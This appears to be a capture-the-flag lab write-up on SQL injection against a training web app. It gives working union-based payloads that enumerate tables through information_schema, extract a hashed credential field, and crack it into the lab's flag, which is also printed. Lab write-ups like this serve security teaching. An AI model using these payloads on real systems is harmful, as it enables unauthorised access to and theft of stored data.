# SQL Injection (SQLi)

## Definition
 
**SQL Injection (SQLi)** is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. This can allow the attacker to view data they are not normally able to access (other users' data, internal tables, credentials, etc.).
 
## How It Works
 
A vulnerable application concatenates user input directly into an SQL query without validation or the use of parameterized (prepared) statements.
 
### Normal Example
 
```sql
SELECT first_name, surname FROM users WHERE id = 1
```
 
The application displays the first name and surname of the user matching the given `id`.
 
### Attack Example
 
An attacker injects SQL code into the `id` parameter:
 
```sql
SELECT first_name, surname FROM users WHERE id = 1 UNION SELECT 1,2
```
 
The database executes the injected query alongside the original one, potentially revealing data that should not normally be accessible.
 
---
 
## Attack Walkthrough
 
### Step 1 — Identify the Vulnerable Parameter
 
Navigate to the member page:
 
```
http://10.11.200.205/?page=member
```
 
Enter a simple numeric value (e.g. `1`) in the search form and observe the result:
 
```
ID: 1
First name: one
Surname: me
```
 
Next, enter a single quote (`'`) as the input value. The application returns a raw SQL error, confirming the input is being concatenated directly into the query without proper sanitization:
 
```
You have an error in your SQL syntax; check the manual that corresponds to
your MariaDB server version for the right syntax to use near '\'' at line 1
```
 
➡️ The `id` parameter is vulnerable to SQL injection.
 
### Step 2 — Determine the Column Count
 
Use `ORDER BY N`, incrementing `N` until the query fails:
 
```
1 ORDER BY 1 --
1 ORDER BY 2 --
1 ORDER BY 3 --   → error: Unknown column '3' in 'order clause'
```
 
➡️ The original query returns **2 columns**.
 
### Step 3 — Locate the Reflected Output Columns
 
Use a `UNION` attack to append a `SELECT` statement to the original query.
 
Payload used:
```
1 UNION SELECT 1,2--
```
 
Result:
```
ID: 1 UNION SELECT 1,2
First name: 1
Surname: 2
```
 
➡️ Both columns are reflected in the response and can therefore be used to extract arbitrary data.
 
### Step 4 — Retrieve Table Names via `information_schema`
 
`INFORMATION_SCHEMA` is a MySQL/MariaDB metadata database containing information about the structure of all databases: tables, columns, indexes, views, constraints, etc.
 
**4.1 — List the tables**
 
```sql
1 UNION SELECT table_name, table_schema FROM information_schema.tables --
```
 
Results obtained:
 
| Table | Database |
|---|---|
| db_default | Member_Brute_Force |
| users | Member_Sql_Injection |
| guestbook | Member_guestbook |
| list_images | Member_images |
| vote_dbs | Member_survey |
 
**4.2 — List the columns of each table**
 
```sql
1 UNION SELECT column_name, table_name FROM information_schema.columns
```
 
Resulting model:
 
```
Database: Member_Brute_Force
  Table: db_default
    - id
    - username
    - password
 
Database: Member_Sql_Injection
  Table: users
    - user_id
    - first_name
    - last_name
    - town
    - country
    - planet
    - commentaire
    - countersign
 
Database: Member_guestbook
  Table: guestbook
    - id_comment
    - comment
    - name
 
Database: Member_images
  Table: list_images
    - id
    - url
    - title
    - comment
 
Database: Member_survey
  Table: vote_dbs
    - id_vote
    - vote
    - nb_vote
    - subject
```
 
**4.3 — Extract the content of a targeted column**
 
Generic syntax:
 
```sql
1 UNION SELECT [column1], [column2] FROM [database].[table];
```
 
Applied to the `commentaire` and `countersign` columns of the `users` table (database `Member_Sql_Injection`):
 
```sql
1 UNION SELECT commentaire, countersign FROM Member_Sql_Injection.users;
```
 
Result obtained: a hint (see screenshot below).
 
![Hint](./Screenshot%20from%202026-07-03%2013-30-51.png)
 
---
 
## Flag Extraction
 
The `countersign` field contains an MD5 hash:
 
```
5ff9d0165b4f92b14994e5c685cdce28
```
 
This hash corresponds to the string **FortyTwo**.
 
Lowercasing this string → **fortytwo**
 
The SHA-256 of `fortytwo` gives the final flag:
 
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```
 
---
 
## References
 
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 